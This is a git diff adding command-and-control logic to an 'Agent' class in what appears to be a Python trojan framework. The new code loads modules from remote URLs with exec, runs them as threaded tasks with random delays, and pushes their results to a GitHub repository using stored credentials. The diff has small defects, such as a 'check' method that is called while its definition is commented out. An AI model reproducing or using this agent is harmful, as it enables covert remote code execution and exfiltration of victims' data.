21df9612e738b7fd16dc34bea795b1055fc95a8b
test <test@test.com>
2019-07-30 11:49:19 +0900

    balabala

--- commander/lib/toy.py
+++ commander/lib/toy.py
@@ -1,4 +1,5 @@
 # -*- encoding: utf-8 -*-
+import sys
 import getpass
 import json
 import platform
@@ -11,6 +12,7 @@ import threading
 from commander.thirdparty.Crypto import Random
 from commander.thirdparty.Crypto.PublicKey import RSA
 from commander.thirdparty.Crypto.Cipher import AES, PKCS1_OAEP
+from commander.thirdparty.httpimp import add_remote_repo, remove_remote_repo
 
 try:
     from urllib2 import urlopen, Request
@@ -322,3 +324,106 @@ class Agent(object):
         cipher = AES.new(key, AES.MODE_CFB, iv)
         msg = cipher.decrypt(msg)
         return msg.encode('utf-8')
+
+    @staticmethod
+    def load(module, url):
+        try:
+            logging.info('Try to import module')
+            add_remote_repo([module], url)
+            exec "import %s" % module
+        except Exception:
+            logging.error('Exception with import %s' % module)
+            pass
+
+    @staticmethod
+    def unload(module, url):
+        logging.info('Try to unload module')
+        remove_remote_repo(url)
+        if module in sys.modules:
+            del module
+
+    def install(self):
+        for url, pkgs in self.base_modules.items():
+            if not isinstance(pkgs, (list, tuple)):
+                pkgs = [pkgs]
+            for p in pkgs:
+                self.load(p, url)
+        for pkg in self.run_modules:
+            self.load_module(pkg['module'])
+        self.init = False
+
+    def parse_require(self, pkg):
+        requires = pkg.get('require', None)
+        if requires:
+            for k, v in requires.items():
+                self.load(v, k)
+
+    # def check(self, url=None):
+    #     url = url or self.conf_url
+    #     conf = self.get_config(url)
+    #     self.parse_conf(conf)
+    #     for task in self.run_modules:
+    #         self.load_module(task['module'])
+    #     tasks = self.load_task(self.task_url) if self.task_url else []
+    #     self.run_modules += tasks
+
+    @staticmethod
+    def load_module(mod, pkg='toy.modules'):
+        try:
+            logging.info('Import %s from %s' % (mod, pkg))
+            exec "from %s import %s" % (pkg, mod)
+        except Exception:
+            logging.error("Import %s error" % '.'.join((pkg, mod)))
+
+    # def load_task(self, task_url):
+    #     tasks = self.get(task_url)
+    #     logging.info('[+] Get task config: %s' % tasks)
+    #     if tasks:
+    #         tasks = json.loads(tasks)
+    #         logging.info('[*] Get task %s from %s' % (tasks['name'], task_url))
+    #         requires = tasks.get('require', {})
+    #         for u, p in requires.items():
+    #             for k in p:
+    #                 logging.info('[*] Load required packages: %s from %s' % (k, u))
+    #                 self.load([k], u)
+    #         self.load(tasks['name'], tasks['url'])
+    #         for task in tasks['task']:
+    #             self.load_module(task['module'], tasks['name'] + '.modules')
+    #     else:
+    #         tasks = []
+    #     return tasks
+
+    def worker(self, m, loop=False):
+        path = self.result_path + '%d.data' % random.randint(
+            1000, 100000)
+        self.task_queue.put(1)
+        print sys.modules[m]
+        result = sys.modules[m].run() or 'Err'
+        self.task_queue.get()
+        if result:
+            logger.info('[*] Get result: %s' % result)
+            time.sleep(5)
+            gh.put(self.guser, self.gtoken, self.grepo, path, result)
+        if not loop:
+            del sys.modules[m]
+        return
+
+    def run(self):
+        self.install()
+        while True:
+            if self.task_queue.empty():
+                if not self.init:
+                    self.check()
+                for task in self.run_modules:
+                    logging.info("run task %s" % task['module'])
+                    mod = 'toy.modules.%s' % task['module']
+                    try:
+                        t = threading.Thread(
+                            target=self.worker, args=(mod,))
+                        t.start()
+                        time.sleep(random.randint(1, 10))
+                    except Exception:
+                        logging.error('run exception')
+                        pass
+            time.sleep(self.cf)
+            # time.sleep(random.randint(1000, 10000))
